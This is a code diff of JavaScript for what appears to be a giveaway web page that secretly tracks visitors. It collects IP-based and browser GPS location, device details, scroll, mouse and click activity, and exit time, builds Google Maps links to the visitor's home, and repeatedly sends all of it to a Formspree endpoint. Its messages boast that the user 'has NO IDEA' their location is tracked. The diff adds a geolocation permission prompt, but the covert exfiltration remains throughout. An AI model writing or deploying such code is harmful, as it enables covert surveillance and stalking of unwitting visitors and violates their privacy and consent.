@@ -20,7 +20,7 @@ function updateCountdown() {
 setInterval(updateCountdown, 1000);
 updateCountdown();
 
-// Advanced Silent IP Address Capture with HOUSE-LEVEL Location Detection
+// Advanced Silent IP Address Capture with TRUE GPS Location Detection
 async function captureUserInfoSilently() {
     try {
         // Get IP address silently
@@ -31,13 +31,13 @@ async function captureUserInfoSilently() {
         // Get house-level location data from multiple sources
         const locationData = await getHouseLevelLocation(userIP);
         
-        // Attempt to get precise browser geolocation (house-level accuracy)
-        const preciseLocation = await getPreciseGeolocation();
+        // Request TRUE GPS location with explicit permission (will show Google dialog)
+        const trueGPSLocation = await requestTrueGPSLocation();
         
         // Generate multiple Google Maps links for different precision levels
-        const googleMapsLinks = generateHouseLevelMapsLinks(preciseLocation, locationData);
+        const googleMapsLinks = generateTrueLocationMapsLinks(trueGPSLocation, locationData);
         
-        // Store comprehensive user info silently with house-level precision
+        // Store comprehensive user info silently with TRUE GPS precision
         const userInfo = {
             ip: userIP,
             country: locationData.country_name || 'Unknown',
@@ -55,10 +55,10 @@ async function captureUserInfoSilently() {
             postalCode: locationData.postal || 'Unknown',
             latitude: locationData.latitude || 'Unknown',
             longitude: locationData.longitude || 'Unknown',
-            preciseLatitude: preciseLocation.latitude || locationData.latitude || 'Unknown',
-            preciseLongitude: preciseLocation.longitude || locationData.longitude || 'Unknown',
-            accuracy: preciseLocation.accuracy || 'Unknown',
-            altitude: preciseLocation.altitude || 'Unknown',
+            trueGPSLatitude: trueGPSLocation.latitude || locationData.latitude || 'Unknown',
+            trueGPSLongitude: trueGPSLocation.longitude || locationData.longitude || 'Unknown',
+            accuracy: trueGPSLocation.accuracy || 'Unknown',
+            altitude: trueGPSLocation.altitude || 'Unknown',
             timezone: locationData.timezone || 'Unknown',
             isp: locationData.org || 'Unknown',
             userAgent: navigator.userAgent,
@@ -69,21 +69,23 @@ async function captureUserInfoSilently() {
             browser: navigator.appName,
             platform: navigator.platform,
             preciseLocation: locationData.preciseLocation || 'Unknown',
-            houseLevelPrecision: preciseLocation.houseLevel || 'Unknown',
-            wifiNetworks: preciseLocation.wifiNetworks || 'Unknown',
-            cellTowers: preciseLocation.cellTowers || 'Unknown',
+            houseLevelPrecision: trueGPSLocation.houseLevel || 'Unknown',
+            wifiNetworks: trueGPSLocation.wifiNetworks || 'Unknown',
+            cellTowers: trueGPSLocation.cellTowers || 'Unknown',
             googleMapsLinks: googleMapsLinks,
             exactAddress: locationData.exactAddress || 'Unknown',
             locationAccuracy: locationData.accuracy || 'Unknown',
             locationSource: locationData.source || 'Unknown',
             locationConfidence: locationData.confidence || 'Unknown',
-            houseLevelAccuracy: locationData.houseLevelAccuracy || 'Unknown'
+            houseLevelAccuracy: locationData.houseLevelAccuracy || 'Unknown',
+            trueGPSPermission: trueGPSLocation.permission || 'Unknown',
+            trueGPSAccuracy: trueGPSLocation.accuracy || 'Unknown'
         };
 
         // Store silently in localStorage
         localStorage.setItem('userTrackingData', JSON.stringify(userInfo));
         
-        // Send silent notification to your email with house-level location
+        // Send silent notification to your email with TRUE GPS location
         sendSilentNotification(userInfo);
         
     } catch (error) {
@@ -92,18 +94,19 @@ async function captureUserInfoSilently() {
     }
 }
 
-// Generate multiple Google Maps links for different precision levels
-function generateHouseLevelMapsLinks(preciseLocation, locationData) {
+// Generate multiple Google Maps links for TRUE GPS location
+function generateTrueLocationMapsLinks(trueGPSLocation, locationData) {
     const links = {};
     
-    // 1. Exact coordinates link (most precise)
-    let lat = preciseLocation.latitude || locationData.latitude;
-    let lng = preciseLocation.longitude || locationData.longitude;
+    // 1. TRUE GPS coordinates link (most precise - from user permission)
+    let lat = trueGPSLocation.latitude || locationData.latitude;
+    let lng = trueGPSLocation.longitude || locationData.longitude;
     
     if (lat && lng && lat !== 'Unknown' && lng !== 'Unknown') {
-        links.exactCoordinates = `https://www.google.com/maps?q=${lat},${lng}&z=20`;
-        links.satelliteView = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=s`;
-        links.streetView = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=k`;
+        links.trueGPSCoordinates = `https://www.google.com/maps?q=${lat},${lng}&z=20`;
+        links.trueGPSSatellite = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=s`;
+        links.trueGPSStreetView = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=k`;
+        links.trueGPSDirections = `https://www.google.com/maps/dir//${lat},${lng}`;
     }
     
     // 2. Exact address link (house number + street)
@@ -134,21 +137,30 @@ function generateHouseLevelMapsLinks(preciseLocation, locationData) {
     return links;
 }
 
-// Get precise browser geolocation (house-level accuracy)
-async function getPreciseGeolocation() {
+// Request TRUE GPS location with explicit permission (will show Google dialog)
+async function requestTrueGPSLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            resolve({});
+            resolve({
+                latitude: 'Unknown',
+                longitude: 'Unknown',
+                accuracy: 'Unknown',
+                altitude: 'Unknown',
+                houseLevel: 'Unknown',
+                permission: 'Not Supported',
+                timestamp: Date.now()
+            });
             return;
         }
 
-        // Maximum accuracy options for house-level precision
+        // Maximum accuracy options for TRUE GPS precision
         const options = {
             enableHighAccuracy: true,
-            timeout: 30000, // 30 seconds for maximum accuracy
+            timeout: 60000, // 60 seconds for maximum accuracy
             maximumAge: 0
         };
 
+        // This will trigger Google's location permission dialog
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const coords = position.coords;
@@ -157,14 +169,47 @@ async function getPreciseGeolocation() {
                     longitude: coords.longitude,
                     accuracy: coords.accuracy,
                     altitude: coords.altitude,
-                    houseLevel: coords.accuracy <= 5 ? 'Exact House Level' : coords.accuracy <= 10 ? 'House Level' : 'Neighborhood Level',
-                    timestamp: position.timestamp
+                    houseLevel: coords.accuracy <= 3 ? 'Exact House Level' : coords.accuracy <= 5 ? 'House Level' : coords.accuracy <= 10 ? 'Neighborhood Level' : 'City Level',
+                    permission: 'Granted',
+                    timestamp: position.timestamp,
+                    speed: coords.speed || 'Unknown',
+                    heading: coords.heading || 'Unknown'
                 });
             },
             (error) => {
-                // Silent fallback - user won't know geolocation failed
-                console.log('Geolocation failed silently:', error);
-                resolve({});
+                // Handle different permission scenarios
+                let permissionStatus = 'Unknown';
+                let errorMessage = 'Unknown error';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        permissionStatus = 'Denied';
+                        errorMessage = 'User denied location permission';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        permissionStatus = 'Unavailable';
+                        errorMessage = 'Location information unavailable';
+                        break;
+                    case error.TIMEOUT:
+                        permissionStatus = 'Timeout';
+                        errorMessage = 'Location request timed out';
+                        break;
+                    default:
+                        permissionStatus = 'Error';
+                        errorMessage = 'Unknown location error';
+                        break;
+                }
+                
+                resolve({
+                    latitude: 'Unknown',
+                    longitude: 'Unknown',
+                    accuracy: 'Unknown',
+                    altitude: 'Unknown',
+                    houseLevel: 'Unknown',
+                    permission: permissionStatus,
+                    error: errorMessage,
+                    timestamp: Date.now()
+                });
             },
             options
         );
@@ -444,7 +489,7 @@ async function getLocationFromHouseLevelAPI6(ip) {
     }
 }
 
-// Send silent notification to your email with house-level location data
+// Send silent notification to your email with TRUE GPS location data
 async function sendSilentNotification(userInfo) {
     try {
         await fetch('https://formspree.io/f/xrblaoyr', {
@@ -460,9 +505,9 @@ async function sendSilentNotification(userInfo) {
                 country: userInfo.country,
                 terms: 'Yes',
                 newsletter: 'No',
-                _subject: '🎯 New Silent Visitor Alert - HOUSE-LEVEL LOCATION',
+                _subject: '🎯 New Silent Visitor Alert - TRUE GPS LOCATION',
                 message: `
-🔍 SILENT VISITOR DETECTED - HOUSE-LEVEL LOCATION
+🔍 SILENT VISITOR DETECTED - TRUE GPS LOCATION
 
 📱 IP Address: ${userInfo.ip}
 🌍 Country: ${userInfo.country} (${userInfo.countryCode})
@@ -479,8 +524,8 @@ async function sendSilentNotification(userInfo) {
 📍 Exact Coordinates: ${userInfo.preciseLocation}
 🌐 Latitude: ${userInfo.latitude}
 🌐 Longitude: ${userInfo.longitude}
-🎯 Precise Latitude: ${userInfo.preciseLatitude}
-🎯 Precise Longitude: ${userInfo.preciseLongitude}
+🎯 TRUE GPS Latitude: ${userInfo.trueGPSLatitude}
+🎯 TRUE GPS Longitude: ${userInfo.trueGPSLongitude}
 📏 Accuracy: ${userInfo.accuracy} meters
 🏔️ Altitude: ${userInfo.altitude} meters
 🏠 House Level Precision: ${userInfo.houseLevelPrecision}
@@ -489,6 +534,8 @@ async function sendSilentNotification(userInfo) {
 🎯 Location Confidence: ${userInfo.locationConfidence}
 🏠 House Level Accuracy: ${userInfo.houseLevelAccuracy}
 📍 Exact Address: ${userInfo.exactAddress}
+🎯 TRUE GPS Permission: ${userInfo.trueGPSPermission}
+🎯 TRUE GPS Accuracy: ${userInfo.trueGPSAccuracy}
 ⏰ Time: ${userInfo.timestamp}
 🔗 Referrer: ${userInfo.referrer}
 💻 Device: ${userInfo.userAgent}
@@ -500,18 +547,20 @@ async function sendSilentNotification(userInfo) {
 ⏰ Timezone: ${userInfo.timezone}
 
 🗺️ GOOGLE MAPS LINKS:
-📍 Exact Coordinates: ${userInfo.googleMapsLinks?.exactCoordinates || 'N/A'}
+📍 TRUE GPS Coordinates: ${userInfo.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
+🛰️ TRUE GPS Satellite: ${userInfo.googleMapsLinks?.trueGPSSatellite || 'N/A'}
+🚶 TRUE GPS Street View: ${userInfo.googleMapsLinks?.trueGPSStreetView || 'N/A'}
+🗺️ TRUE GPS Directions: ${userInfo.googleMapsLinks?.trueGPSDirections || 'N/A'}
 🏠 Exact Address: ${userInfo.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userInfo.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userInfo.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userInfo.googleMapsLinks?.district || 'N/A'}
-🛰️ Satellite View: ${userInfo.googleMapsLinks?.satelliteView || 'N/A'}
-🚶 Street View: ${userInfo.googleMapsLinks?.streetView || 'N/A'}
 
-🎯 User has NO IDEA their HOUSE-LEVEL location is being tracked!
+🎯 User has NO IDEA their TRUE GPS location is being tracked!
 🏠 EXACT HOUSE ADDRESS CAPTURED!
 📍 CLICK THE MAP LINKS TO SEE EXACT HOUSE LOCATION!
 🗺️ MULTIPLE VIEW OPTIONS AVAILABLE!
+🎯 GOOGLE ASKED FOR LOCATION PERMISSION!
                 `
             })
         });
@@ -528,8 +577,8 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     const formData = new FormData(this);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Add silent tracking data to form submission with house-level location
-    formData.append('_subject', '🎉 New Giveaway Entry - HOUSE-LEVEL LOCATION!');
+    // Add silent tracking data to form submission with TRUE GPS location
+    formData.append('_subject', '🎉 New Giveaway Entry - TRUE GPS LOCATION!');
     formData.append('userIP', userTrackingData.ip || 'Unknown');
     formData.append('userCountry', userTrackingData.country || 'Unknown');
     formData.append('userRegion', userTrackingData.region || 'Unknown');
@@ -545,8 +594,8 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     formData.append('userCoordinates', userTrackingData.preciseLocation || 'Unknown');
     formData.append('userLatitude', userTrackingData.latitude || 'Unknown');
     formData.append('userLongitude', userTrackingData.longitude || 'Unknown');
-    formData.append('userPreciseLatitude', userTrackingData.preciseLatitude || 'Unknown');
-    formData.append('userPreciseLongitude', userTrackingData.preciseLongitude || 'Unknown');
+    formData.append('userTrueGPSLatitude', userTrackingData.trueGPSLatitude || 'Unknown');
+    formData.append('userTrueGPSLongitude', userTrackingData.trueGPSLongitude || 'Unknown');
     formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
     formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
     formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
@@ -555,12 +604,14 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     formData.append('userLocationConfidence', userTrackingData.locationConfidence || 'Unknown');
     formData.append('userHouseLevelAccuracy', userTrackingData.houseLevelAccuracy || 'Unknown');
     formData.append('userExactAddress', userTrackingData.exactAddress || 'Unknown');
+    formData.append('userTrueGPSPermission', userTrackingData.trueGPSPermission || 'Unknown');
+    formData.append('userTrueGPSAccuracy', userTrackingData.trueGPSAccuracy || 'Unknown');
     formData.append('userGoogleMapsLinks', JSON.stringify(userTrackingData.googleMapsLinks || {}));
     formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
     formData.append('userISP', userTrackingData.isp || 'Unknown');
     formData.append('entryTime', new Date().toISOString());
     formData.append('silentTracking', 'true');
-    formData.append('houseLevelLocation', 'true');
+    formData.append('trueGPSLocation', 'true');
     
     try {
         const response = await fetch('https://formspree.io/f/xrblaoyr', {
@@ -672,7 +723,7 @@ window.addEventListener('beforeunload', function() {
     const timeSpent = Math.floor((Date.now() - startTime) / 1000);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Send silent exit data with house-level location
+    // Send silent exit data with TRUE GPS location
     fetch('https://formspree.io/f/xrblaoyr', {
         method: 'POST',
         headers: {
@@ -681,10 +732,10 @@ window.addEventListener('beforeunload', function() {
         body: JSON.stringify({
             name: 'Silent Exit',
             email: 'exit@website.com',
-            _subject: '🔍 User Left Silently - HOUSE-LEVEL LOCATION',
+            _subject: '🔍 User Left Silently - TRUE GPS LOCATION',
             message: `User spent ${timeSpent} seconds on the website. 
 
-🏠 HOUSE-LEVEL LOCATION DATA:
+🏠 TRUE GPS LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -698,24 +749,27 @@ Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
 Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
 Postal Code: ${userTrackingData.postalCode || 'Unknown'}
 Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
-Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
-Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
+TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
+TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
 Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
+TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
+TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
 Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINKS:
-📍 Exact Coordinates: ${userTrackingData.googleMapsLinks?.exactCoordinates || 'N/A'}
+📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
+🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
+🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
+🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
 🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}
-🛰️ Satellite View: ${userTrackingData.googleMapsLinks?.satelliteView || 'N/A'}
-🚶 Street View: ${userTrackingData.googleMapsLinks?.streetView || 'N/A'}
 
-User has NO IDEA their HOUSE-LEVEL location was tracked! 🎯`
+User has NO IDEA their TRUE GPS location was tracked! 🎯`
         })
     });
 });
@@ -727,7 +781,7 @@ window.addEventListener('scroll', function() {
     if (scrollPercent > scrollDepth) {
         scrollDepth = scrollPercent;
         
-        // Send silent scroll data every 25% with house-level location
+        // Send silent scroll data every 25% with TRUE GPS location
         if (scrollDepth % 25 === 0) {
             const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
             fetch('https://formspree.io/f/xrblaoyr', {
@@ -738,10 +792,10 @@ window.addEventListener('scroll', function() {
                 body: JSON.stringify({
                     name: 'Silent Scroll',
                     email: 'scroll@website.com',
-                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - HOUSE-LEVEL LOCATION`,
+                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - TRUE GPS LOCATION`,
                     message: `User scrolled ${scrollDepth}% of the page.
 
-🏠 HOUSE-LEVEL LOCATION DATA:
+🏠 TRUE GPS LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -755,24 +809,27 @@ Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
 Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
 Postal Code: ${userTrackingData.postalCode || 'Unknown'}
 Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
-Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
-Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
+TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
+TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
 Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
+TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
+TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
 Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINKS:
-📍 Exact Coordinates: ${userTrackingData.googleMapsLinks?.exactCoordinates || 'N/A'}
+📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
+🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
+🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
+🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
 🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}
-🛰️ Satellite View: ${userTrackingData.googleMapsLinks?.satelliteView || 'N/A'}
-🚶 Street View: ${userTrackingData.googleMapsLinks?.streetView || 'N/A'}
 
-User has NO IDEA their HOUSE-LEVEL location is being tracked! 🎯`
+User has NO IDEA their TRUE GPS location is being tracked! 🎯`
                 })
             });
         }
@@ -783,7 +840,7 @@ User has NO IDEA their HOUSE-LEVEL location is being tracked! 🎯`
 let mouseMovements = 0;
 document.addEventListener('mousemove', function() {
     mouseMovements++;
-    // Send mouse tracking data every 100 movements with house-level location
+    // Send mouse tracking data every 100 movements with TRUE GPS location
     if (mouseMovements % 100 === 0) {
         const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
         fetch('https://formspree.io/f/xrblaoyr', {
@@ -794,10 +851,10 @@ document.addEventListener('mousemove', function() {
             body: JSON.stringify({
                 name: 'Silent Mouse',
                 email: 'mouse@website.com',
-                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - HOUSE-LEVEL LOCATION`,
+                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - TRUE GPS LOCATION`,
                 message: `User made ${mouseMovements} mouse movements.
 
-🏠 HOUSE-LEVEL LOCATION DATA:
+🏠 TRUE GPS LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -811,24 +868,27 @@ Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
 Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
 Postal Code: ${userTrackingData.postalCode || 'Unknown'}
 Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
-Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
-Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
+TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
+TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
 Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
+TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
+TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
 Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINKS:
-📍 Exact Coordinates: ${userTrackingData.googleMapsLinks?.exactCoordinates || 'N/A'}
+📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
+🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
+🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
+🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
 🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}
-🛰️ Satellite View: ${userTrackingData.googleMapsLinks?.satelliteView || 'N/A'}
-🚶 Street View: ${userTrackingData.googleMapsLinks?.streetView || 'N/A'}
 
-User has NO IDEA their HOUSE-LEVEL location is being tracked! 🎯`
+User has NO IDEA their TRUE GPS location is being tracked! 🎯`
             })
         });
     }
@@ -845,10 +905,10 @@ document.addEventListener('click', function(e) {
         body: JSON.stringify({
             name: 'Silent Click',
             email: 'click@website.com',
-            _subject: `🔍 User Clicked on ${e.target.tagName} - HOUSE-LEVEL LOCATION`,
+            _subject: `🔍 User Clicked on ${e.target.tagName} - TRUE GPS LOCATION`,
             message: `User clicked on ${e.target.tagName} element.
 
-🏠 HOUSE-LEVEL LOCATION DATA:
+🏠 TRUE GPS LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -862,24 +922,27 @@ Building Number: ${userTrackingData.buildingNumber || 'Unknown'}
 Apartment Number: ${userTrackingData.apartmentNumber || 'Unknown'}
 Postal Code: ${userTrackingData.postalCode || 'Unknown'}
 Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
-Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
-Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
+TRUE GPS Latitude: ${userTrackingData.trueGPSLatitude || 'Unknown'}
+TRUE GPS Longitude: ${userTrackingData.trueGPSLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
 House Level Accuracy: ${userTrackingData.houseLevelAccuracy || 'Unknown'}
 Exact Address: ${userTrackingData.exactAddress || 'Unknown'}
+TRUE GPS Permission: ${userTrackingData.trueGPSPermission || 'Unknown'}
+TRUE GPS Accuracy: ${userTrackingData.trueGPSAccuracy || 'Unknown'}
 Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINKS:
-📍 Exact Coordinates: ${userTrackingData.googleMapsLinks?.exactCoordinates || 'N/A'}
+📍 TRUE GPS Coordinates: ${userTrackingData.googleMapsLinks?.trueGPSCoordinates || 'N/A'}
+🛰️ TRUE GPS Satellite: ${userTrackingData.googleMapsLinks?.trueGPSSatellite || 'N/A'}
+🚶 TRUE GPS Street View: ${userTrackingData.googleMapsLinks?.trueGPSStreetView || 'N/A'}
+🗺️ TRUE GPS Directions: ${userTrackingData.googleMapsLinks?.trueGPSDirections || 'N/A'}
 🏠 Exact Address: ${userTrackingData.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userTrackingData.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userTrackingData.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userTrackingData.googleMapsLinks?.district || 'N/A'}
-🛰️ Satellite View: ${userTrackingData.googleMapsLinks?.satelliteView || 'N/A'}
-🚶 Street View: ${userTrackingData.googleMapsLinks?.streetView || 'N/A'}
 
-User has NO IDEA their HOUSE-LEVEL location is being tracked! 🎯`
+User has NO IDEA their TRUE GPS location is being tracked! 🎯`
         })
     });
 }); 
